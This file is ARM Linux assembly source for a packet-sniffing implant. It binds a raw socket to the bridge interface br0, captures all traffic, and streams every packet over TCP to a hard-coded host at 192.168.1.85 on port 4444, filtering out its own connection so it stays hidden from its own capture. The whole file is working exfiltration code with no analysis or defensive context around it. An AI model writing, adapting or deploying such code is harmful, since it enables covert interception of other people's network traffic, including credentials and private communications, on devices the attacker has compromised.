.text            
.global _start

////////////////////////////////////////////////
// Read a packet from socket at r0 into buffer
// Return number of bytes read in r0
////////////////////////////////////////////////
sniff_data:
    push { r4, r5, r11, lr }

    mov r11, r0			// store socket fd in r11

filter_loop:
    mov r0, r11			// raw socket fd
    ldr r1, =buffer
    ldr r2, =len
    mov r3, #0			// flags
    mov r4, #0			// addr
    mov r5, #0			// addr len
    mov r7, #0x124		// recvfrom system call
    swi 0

    cmp r0, #0
    blt recvfrom_error

    ////////////////////////////////////////////////
    // Crude filter to receive again if source port
    // or dest port is equal to 4444
    ////////////////////////////////////////////////
    ldr r1, =buffer
    add r1, r1, #34		// index 34 is start of tcp src port
    ldrb r2, [r1]
    cmp r2, #0x11
    bne dport			// check dport if msb does not match 4444 msb
    add r1, r1, #1
    ldrb r2, [r1]
    cmp r2, #0x5c
    beq filter_loop		// loop if lsb matches 4444 lsb
dport:
    ldr r1, =buffer
    add r1, r1, #36		// index 36 is start of tcp dest port
    ldrb r2, [r1]
    cmp r2, #0x11
    bne break_filter_loop	// break if msb does not match 4444 msb
    add r1, r1, #1
    ldrb r2, [r1]
    cmp r2, #0x5c
    beq filter_loop		// loop if lsb matches 4444 lsb
break_filter_loop:

    pop { r4, r5, r11, pc }

_start:
    ////////////////////////////////////////////////
    // Create tcp client socket and put fd in r6
    ////////////////////////////////////////////////
    mov r0, #2			// domain AF_INET
    mov r1, #1			// type SOCK_STREAM
    mov r2, #0			// protocol
    mov r7, #0x119		// socket system call
    swi 0

    mov r6, r0			// socket fd in to r6

    ldr r1, =servaddr		// set berkley sockaddr
    mov r2, #16			// set addr length
    mov r7, #0x11b		// connect system call
    swi 0

    cmp r0, #0			// Check connect return
    blt connect_error

    ////////////////////////////////////////////////
    // Create and bind raw socket and put fd in r5
    ////////////////////////////////////////////////
    mov r0, #17			// domain AF_PACKET
    mov r1, #3			// type SOCK_RAW
    mov r2, #0x0300		// protocol ETH_P_ALL 0x3
    //mov r2, #0x03		// protocol ETH_P_ALL 0x3
    mov r7, #0x119		// socket system call
    swi 0

    mov r5, r0			// socket fd in to r5

    mov r1, #1			// SOL_SOCKET
    mov r2, #2			// SOL_REUSEADDR
    ldr r3, =sockopt
    mov r4, #4
    mov r7, #0x126		// setsockopt system call
    swi 0

    mov r0, r5
    mov r1, #1			// SOL_SOCKET
    mov r2, #25			// SO_BINDTODEVICE
    ldr r3, =dev
    ldr r4, =dev_len
    mov r7, #0x126		// setsockopt system call
    swi 0

    cmp r0, #0			// Check bind to device return
    blt bind_error

sniff_loop:
    mov r0, r5
    bl sniff_data		// Read packet into buffer

    mov r2, r0			// Only write as much as was read
    mov r0, r6			// Write to TCP socket
    ldr r1, =buffer
    mov r7, #4			// write system call
    swi 0

    b sniff_loop		// Loop forever

    mov r7, #1			// exit system call
    swi 0

connect_error:
    push { r0 }

    mov r0, #2			// stderr
    ldr r1, =conn_err
    ldr r2, =conn_err_len
    mov r7, #4			// write system call
    swi 0

    pop { r0 }
    mov r7, #1			// exit system call
    swi 0

bind_error:
    push { r0 }

    mov r0, #2			// stderr
    ldr r1, =bind_err
    ldr r2, =bind_err_len
    mov r7, #4			// write system call
    swi 0

    pop { r0 }
    mov r7, #1			// exit system call
    swi 0

recvfrom_error:
    push { r0 }

    mov r0, #2			// stderr
    ldr r1, =recvfrom_err
    ldr r2, =recvfrom_err_len
    mov r7, #4			// write system call
    swi 0

    pop { r0 }
    mov r7, #1			// exit system call
    swi 0

.data
buffer:
    .fill 1600
buffer_end:
len = .-buffer

sockopt:
    .fill 4

dev:
    .asciz "br0"
dev_len = .-dev

conn_err:
    .asciz "failed to connect\n"
conn_err_len = .-conn_err

bind_err:
    .asciz "failed to bind to device\n"
bind_err_len = .-bind_err

recvfrom_err:
    .asciz "failed to recvfrom\n"
recvfrom_err_len = .-recvfrom_err

servaddr:
    .ascii "\x02\x00"		// AF_INET
    .ascii "\x11\x5c"		// port 4444
    .byte 192,168,1,85		// 192.168.1.85
    .byte 0,0,0,0,0,0,0,0
